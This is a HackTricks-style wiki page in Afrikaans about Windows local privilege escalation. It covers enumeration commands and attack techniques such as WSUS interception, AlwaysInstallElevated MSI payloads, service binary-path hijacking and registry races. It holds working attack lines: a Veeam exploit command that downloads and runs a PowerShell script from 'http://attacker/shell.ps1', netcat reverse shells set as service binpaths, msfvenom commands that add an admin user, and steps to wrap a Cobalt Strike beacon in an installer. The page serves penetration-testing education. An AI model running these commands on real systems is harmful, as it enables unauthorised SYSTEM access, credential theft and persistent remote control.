# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Beste tool om Windows local privilege escalation-vektore te vind:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Aanvanklike Windows-teorie

### Access Tokens

**As jy nie weet wat Windows Access Tokens is nie, lees die volgende bladsy voordat jy voortgaan:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Kyk na die volgende bladsy vir meer inligting oor ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integriteitsvlakke

**As jy nie weet wat integriteitsvlakke in Windows is nie, moet jy die volgende bladsy lees voordat jy voortgaan:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-sekuriteitskontroles

Daar is verskillende dinge in Windows wat jou kan **verhoed om die stelsel te enumerereer**, uitvoerbare lêers te laat loop of selfs **jou aktiwiteite te detekteer**. Jy moet die volgende **bladsy lees** en al hierdie **verdedigingsmeganismes** **enumerereer** voordat jy met die privilege escalation-enumerering begin:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess-stille elevasie

UIAccess-prosesse wat deur `RAiLaunchAdminProcess` geloods word, kan misbruik word om High IL te bereik sonder prompts wanneer AppInfo se secure-path-kontroles omseil word. Kyk hier na die toegewyde UIAccess/Admin Protection-bypass-werkvloei:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation kan misbruik word vir ’n arbitrêre SYSTEM-registry-skrywing (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Onlangse Windows-builds het ook ’n **SMB arbitrary-port** LPE-pad bekendgestel waar ’n bevoorregte plaaslike NTLM-authentisering oor ’n hergebruikte SMB TCP-verbinding gereflekteer word:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Stelselinligting

### Enumerering van weergawe-inligting

Kontroleer of die Windows-weergawe enige bekende kwesbaarheid het (kontroleer ook die toegepaste patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Weergawe Exploits

Hierdie [site](https://msrc.microsoft.com/update-guide/vulnerability) is handig om gedetailleerde inligting oor Microsoft-sekuriteitskwesbaarhede op te soek. Hierdie databasis bevat meer as 4 700 sekuriteitskwesbaarhede, wat die **massiewe aanvaloppervlak** wys wat ’n Windows-omgewing bied.

**Op die stelsel**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas het watson ingebed)_

**Plaaslik met stelselinligting**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-repositories van exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Omgewing

Is enige credential/Juicy info in die env-veranderlikes gestoor?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-geskiedenis
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-transkripsielêers

Jy kan leer hoe om dit aan te skakel by [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Besonderhede van PowerShell-pyplynuitvoerings word aangeteken, insluitend uitgevoerde opdragte, opdraginvokasies en dele van skrifte. Volledige uitvoeringsbesonderhede en uitvoerresultate word egter moontlik nie vasgelê nie.

Om dit te aktiveer, volg die instruksies in die "Transcript files"-afdeling van die dokumentasie, en kies **"Module Logging"** in plaas van **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Om die laaste 15 gebeurtenisse uit PowerShell-logboeke te sien, kan jy uitvoer:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

'n Volledige aktiwiteits- en inhoudsrekord van die script se uitvoering word vasgelê, wat verseker dat elke kodeblok gedokumenteer word terwyl dit loop. Hierdie proses bewaar 'n omvattende ouditspoor van elke aktiwiteit, wat waardevol is vir forensiese ondersoeke en die ontleding van kwaadwillige gedrag. Deur alle aktiwiteit tydens uitvoering te dokumenteer, word gedetailleerde insigte in die proses verskaf.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logging-gebeurtenisse vir die Script Block kan in die Windows Event Viewer gevind word by die pad: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Om die laaste 20 gebeurtenisse te sien, kan jy gebruik:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internetinstellings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Aandrywers
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Jy kan die stelsel kompromitteer indien die updates nie met http**S** aangevra word nie, maar met http.

Jy begin deur te kontroleer of die netwerk ’n nie-SSL WSUS update gebruik deur die volgende in cmd uit te voer:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Of die volgende in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
As jy 'n antwoord soos een van die volgende kry:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
En as `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` of `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gelyk is aan `1`.

Dan, **is dit exploiteerbaar.** As die laaste registry gelyk is aan `0`, sal die WSUS-inskrywing geïgnoreer word.

Om hierdie kwesbaarheid te eksploiteer, kan jy tools soos [Wsuxploit](https://github.com/pimps/wsuxploit) en [pyWSUS ](https://github.com/GoSecure/pywsus) gebruik - Dit is MiTM weaponized exploit scripts om 'fake' updates in nie-SSL WSUS-verkeer in te spuit.

Lees die navorsing hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lees die volledige verslag hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Basies is dit die fout wat hierdie bug eksploiteer:

> As ons die vermoë het om ons plaaslike user proxy te wysig, en Windows Updates die proxy gebruik wat in Internet Explorer se settings opgestel is, het ons dus die vermoë om [PyWSUS](https://github.com/GoSecure/pywsus) plaaslik te run om ons eie verkeer te onderskep en code as 'n elevated user op ons asset uit te voer.
>
> Verder, aangesien die WSUS-service die huidige user se settings gebruik, sal dit ook sy certificate store gebruik. As ons 'n self-signed certificate vir die WSUS-hostname genereer en hierdie certificate by die huidige user se certificate store voeg, sal ons beide HTTP- en HTTPS-WSUS-verkeer kan onderskep. WSUS gebruik geen HSTS-agtige mechanisms om 'n trust-on-first-use-tipe validasie op die certificate te implementeer nie. As die certificate wat aangebied word deur die user vertrou word en die korrekte hostname het, sal dit deur die service aanvaar word.

Jy kan hierdie kwesbaarheid eksploiteer deur die tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) te gebruik (sodra dit liberated is).

## Derdeparty Auto-Updaters en Agent IPC (local privesc)

Baie enterprise-agents stel 'n localhost IPC-surface en 'n privileged update channel bloot. As enrollment na 'n attacker server gedwing kan word en die updater 'n rogue root CA of swak signer checks vertrou, kan 'n local user 'n malicious MSI lewer wat deur die SYSTEM-service geïnstalleer word. Sien 'n veralgemeende technique (gebaseer op die Netskope stAgentSvc-chain – CVE-2025-0309) hier:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stel 'n localhost-service op **TCP/9401** bloot wat attacker-controlled messages verwerk, wat arbitrêre commands as **NT AUTHORITY\SYSTEM** toelaat.<sup>[[12]](#references)</sup>

- **Recon**: bevestig die listener en weergawe, bv. `netstat -ano | findstr 9401` en `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: plaas 'n PoC soos `VeeamHax.exe` met die vereiste Veeam DLLs in dieselfde directory, en trigger dan 'n SYSTEM-payload oor die plaaslike socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Die diens voer die opdrag as SYSTEM uit.
## KrbRelayUp

’n **local privilege escalation**-kwesbaarheid bestaan in Windows-**domain**-omgewings onder spesifieke voorwaardes. Hierdie voorwaardes sluit omgewings in waar **LDAP signing nie afgedwing word nie,** gebruikers self-regte het wat hulle toelaat om **Resource-Based Constrained Delegation (RBCD)** op te stel, en gebruikers die vermoë het om rekenaars binne die domain te skep. Dit is belangrik om daarop te let dat hierdie **vereistes** deur middel van **default settings** nagekom word.

Vind die **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Vir meer inligting oor die aanvalsvloei, kyk na [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**As** hierdie 2 registers **geaktiveer** is (waarde is **0x1**), kan gebruikers met enige privilege `*.msi`-lêers as NT AUTHORITY\\**SYSTEM** **installeer** (uitvoer).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
As jy ’n meterpreter session het, kan jy hierdie tegniek outomatiseer deur die module **`exploit/windows/local/always_install_elevated`** te gebruik

### PowerUP

Gebruik die `Write-UserAddMSI`-opdrag van power-up om binne die huidige gids ’n Windows MSI-binêre lêer te skep om voorregte te eskaleer. Hierdie script skryf ’n voorafsaamgestelde MSI-installeerder uit wat vir ’n gebruiker-/groepbyvoeging vra (dus sal jy GIU-toegang benodig):
```
Write-UserAddMSI
```
Voer eenvoudig die geskepte binary uit om privileges te eskaleer.

### MSI Wrapper

Lees hierdie tutoriaal om te leer hoe om ’n MSI wrapper met hierdie tools te skep. Let daarop dat jy ’n "**.bat**"-lêer kan wrap as jy **slegs** **command lines** wil **execute**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Skep MSI met WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Skep MSI met Visual Studio

- **Genereer** met Cobalt Strike of Metasploit ’n **nuwe Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Maak **Visual Studio** oop, kies **Create a new project** en tik "installer" in die soekkassie. Kies die **Setup Wizard**-projek en klik **Next**.
- Gee die projek ’n naam, soos **AlwaysPrivesc**, gebruik **`C:\privesc`** as die ligging, kies **place solution and project in the same directory**, en klik **Create**.
- Hou aan om **Next** te klik totdat jy by stap 3 van 4 kom (kies lêers om in te sluit). Klik **Add** en kies die Beacon payload wat jy pas gegenereer het. Klik dan **Finish**.
- Merk die **AlwaysPrivesc**-projek in die **Solution Explorer** en verander in die **Properties** **TargetPlatform** van **x86** na **x64**.
- Daar is ander eienskappe wat jy kan verander, soos die **Author** en **Manufacturer**, wat die geïnstalleerde app meer legitiem kan laat lyk.
- Regsklik op die projek en kies **View > Custom Actions**.
- Regsklik op **Install** en kies **Add Custom Action**.
- Dubbelklik op **Application Folder**, kies jou **beacon.exe**-lêer en klik **OK**. Dit verseker dat die beacon payload uitgevoer word sodra die installer uitgevoer word.
- Verander onder die **Custom Action Properties** **Run64Bit** na **True**.
- **Build** dit ten slotte.
- As die waarskuwing `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` vertoon word, maak seker dat jy die platform op x64 gestel het.

### MSI-installasie

Om die **installasie** van die kwaadwillige `.msi`-lêer in die **agtergrond** uit te voer:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Om hierdie kwesbaarheid te exploit, kan jy gebruik: _exploit/windows/local/always_install_elevated_

## Antivirus en Detectors

### Ouditinstellings

Hierdie instellings bepaal wat **aangeteken** word, dus moet jy let op
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, dit is interessant om te weet waarheen die logs gestuur word
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** is ontwerp vir die **bestuur van plaaslike Administrator-wagwoorde**, om te verseker dat elke wagwoord **uniek, ewekansig en gereeld opgedateer** is op rekenaars wat aan ’n domein gekoppel is. Hierdie wagwoorde word veilig binne Active Directory gestoor en kan slegs verkry word deur gebruikers aan wie voldoende toestemmings deur ACLs toegeken is, wat hulle toelaat om plaaslike admin-wagwoorde te sien indien hulle gemagtig is.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Indien aktief, word **plaintext-wagwoorde in LSASS** (Local Security Authority Subsystem Service) gestoor.\
[**Meer inligting oor WDigest op hierdie bladsy**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Vanaf **Windows 8.1** het Microsoft verbeterde beskerming vir die Local Security Authority (LSA) bekendgestel om pogings deur onvertroude prosesse te **blokkeer** om **die geheue daarvan te lees** of kode in te spuit, wat die stelsel verder beveilig.\
[**Meer inligting oor LSA Protection hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** is in **Windows 10** bekendgestel. Die doel daarvan is om die geloofsbriewe wat op ’n toestel gestoor word, teen bedreigings soos pass-the-hash-aanvalle te beskerm.| [**Meer inligting oor Credentials Guard hier.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Gekaste Bewyse

**Domeinbewyse** word deur die **Local Security Authority** (LSA) geverifieer en deur bedryfstelselkomponente gebruik. Wanneer ’n gebruiker se aanmelddata deur ’n geregistreerde sekuriteitspakket geverifieer word, word domeinbewyse vir die gebruiker tipies gevestig.\
[**Meer inligting oor Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Gebruikers en Groepe

### Enumereer Gebruikers en Groepe

Jy moet nagaan of enige van die groepe waaraan jy behoort interessante toestemmings het.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Bevoorregte groepe

As jy **aan ’n bevoorregte groep behoort, kan jy moontlik privileges eskaleer**. Leer hier meer oor bevoorregte groepe en hoe om hulle te abuse om privileges te eskaleer:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Leer meer** oor wat ’n **token** op hierdie bladsy is: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Gaan die volgende bladsy na om **meer te leer oor interessante tokens** en hoe om hulle te abuse:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Aangemelde gebruikers / Sessions
```bash
qwinsta
klist sessions
```
### Tuisvouers
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Wagwoordbeleid
```bash
net accounts
```
### Kry die inhoud van die knipbord
```bash
powershell -command "Get-Clipboard"
```
## Lopende prosesse

### Lêer- en vouertoestemmings

Eerstens, wanneer jy die prosesse lys, **kyk vir wagwoorde binne die opdragreël van die proses**.\
Kyk of jy **’n lopende binêre lêer kan oorskryf** of of jy skryftoestemmings op die binêre vouer het om moontlike [**DLL Hijacking attacks**](dll-hijacking/index.html) uit te buit:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Kontroleer altyd vir moontlike [**electron/cef/chromium debuggers** wat loop; jy kan dit misbruik om privileges te eskaleer](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Kontroleer die toestemmings van die prosesse se binaries**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kontroleer toestemmings van die vouers van die prosesse se binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Wagwoordontginning uit geheue

Jy kan ’n geheuestorting van ’n lopende proses skep deur **procdump** van sysinternals te gebruik. Dienste soos FTP het die **credentials in clear text in memory**; probeer om die geheue te stort en die credentials te lees.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Onveilige GUI-toepassings

**Toepassings wat as SYSTEM loop, kan ’n gebruiker toelaat om ’n CMD te begin of deur gidse te blaai.**

Voorbeeld: "Windows Help and Support" (Windows + F1), soek vir "command prompt", klik op "Click to open Command Prompt"

## Dienste

Service Triggers laat Windows toe om ’n diens te begin wanneer sekere toestande voorkom (named pipe/RPC endpoint-aktiwiteit, ETW-gebeurtenisse, IP-beskikbaarheid, toestel-aansluiting, GPO-verversing, ens.). Selfs sonder SERVICE_START-regte kan jy dikwels bevoorregte dienste begin deur hul triggers te aktiveer. Sien enumerasie- en aktiveringstegnieke hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Kry ’n lys van dienste:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Toestemmings

Jy kan **sc** gebruik om inligting oor ’n diens te verkry
```bash
sc qc <service_name>
```
Dit word aanbeveel om die binary **accesschk** van _Sysinternals_ te hê om die vereiste privilegiëvlak vir elke diens na te gaan.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Dit word aanbeveel om te kontroleer of "Authenticated Users" enige diens kan wysig:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Aktiveer diens

If you are having this error (for example with SSDPSRV):

_Stelselfout 1058 het voorgekom._\
_Die diens kan nie begin word nie, óf omdat dit gedeaktiveer is óf omdat geen geaktiveerde toestelle daaraan gekoppel is nie._

You can enable it using
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Neem in ag dat die diens upnphost van SSDPSRV afhanklik is om te werk (vir XP SP1)**

**Nog ’n oplossing** vir hierdie probleem is om die volgende uit te voer:
```
sc.exe config usosvc start= auto
```
### **Wysig diens se binary-pad**

In die scenario waar die "Authenticated users"-groep **SERVICE_ALL_ACCESS** op 'n diens besit, is dit moontlik om die diens se uitvoerbare binary te wysig. Om **sc** te wysig en uit te voer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Herbegin diens
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Bevoegdhede kan deur verskeie toestemmings geëskaleer word:

- **SERVICE_CHANGE_CONFIG**: Laat herkonfigurasie van die diensbinary toe.
- **WRITE_DAC**: Maak herkonfigurasie van toestemmings moontlik, wat lei tot die vermoë om dienskonfigurasies te verander.
- **WRITE_OWNER**: Laat die verkryging van eienaarskap en herkonfigurasie van toestemmings toe.
- **GENERIC_WRITE**: Erfenis van die vermoë om dienskonfigurasies te verander.
- **GENERIC_ALL**: Erfenis ook van die vermoë om dienskonfigurasies te verander.

Vir die opsporing en uitbuiting van hierdie kwesbaarheid kan _exploit/windows/local/service_permissions_ gebruik word.

### Swak toestemmings op diensbinaries

As ’n diens as **`LocalSystem`**, **`LocalService`**, **`NetworkService`** of ’n bevoorregte domeinrekening loop, maar **gebruikers met lae bevoegdhede die diens-EXE of sy ouerlêer kan wysig**, kan die diens dikwels oorgeneem word deur **die binary te vervang en die diens te herbegin**.

**Kontroleer of jy die binary wat deur ’n diens uitgevoer word, kan wysig** of of jy **skryftoestemmings op die lêergids** het waar die binary geleë is ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Jy kan elke binary wat deur ’n diens uitgevoer word, met **wmic** verkry (nie in system32 nie) en jou toestemmings met **icacls** kontroleer:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Jy kan ook **sc** en **icacls** gebruik:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Soek na gevaarlike ACLs wat aan **`Everyone`**, **`BUILTIN\Users`** of **`Authenticated Users`** toegestaan is, veral **`(F)`**, **`(M)`** of **`(W)`** op die diens se executable of op die gids wat dit bevat. ’n Praktiese misbruikvloei is:<sup>[[27]](#references)</sup>

1. Bevestig die diensrekening en executable-pad met `sc qc <service_name>`.
2. Bevestig dat die binary skryfbaar is met `icacls <path>`.
3. Vervang die diens se binary met ’n payload of ’n geldige kwaadwillige diens-binary.
4. Herbegin die diens met `sc stop <service_name> && sc start <service_name>` (of wag vir ’n herlaai / diens-trigger).

Nuttige geoutomatiseerde kontroles:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> As die diens nie 'n normale gebruiker toelaat om dit te herbegin nie, kyk of dit outomaties tydens opstart begin, 'n failure action het wat dit herbegin, of indirek deur die toepassing wat dit gebruik, geaktiveer kan word.

### Wysigtoestemmings vir diensregister

Jy moet nagaan of jy enige diensregister kan wysig.\
Jy kan **check** oor jou **toestemmings** vir 'n diens-**register** deur:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Daar moet nagegaan word of **Authenticated Users** of **NT AUTHORITY\INTERACTIVE** `FullControl`-toestemmings het. Indien wel, kan die binêre lêer wat deur die diens uitgevoer word, gewysig word.

Om die Path van die binêre lêer wat uitgevoer word, te verander:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race na arbitrary HKLM value write (ATConfig)

Sommige Windows Accessibility features skep per-user **ATConfig**-sleutels wat later deur ’n **SYSTEM**-proses na ’n HKLM-sessiesleutel gekopieer word. ’n Registry **symbolic link race** kan daardie bevoorregte write na **enige HKLM-pad** herlei, wat ’n arbitrary HKLM **value write**-primitive bied.<sup>[[18]](#references)</sup>

Sleutelliggings (voorbeeld: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lys geïnstalleerde Accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stoor user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` word tydens aanmelding/secure-desktop-oorgange geskep en is deur die gebruiker skryfbaar.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Vul die **HKCU ATConfig**-value wat jy wil hê deur SYSTEM geskryf moet word.
2. Trigger die secure-desktop copy (byvoorbeeld **LockWorkstation**), wat die AT broker flow begin.
3. **Win the race** deur ’n **oplock** op `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` te plaas; wanneer die oplock aktiveer, vervang die **HKLM Session ATConfig**-sleutel met ’n **registry link** na ’n protected HKLM-teiken.
4. SYSTEM skryf die attacker-chosen value na die redirected HKLM-pad.

Sodra jy arbitrary HKLM value write het, pivot na LPE deur service configuration values te oorskryf:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
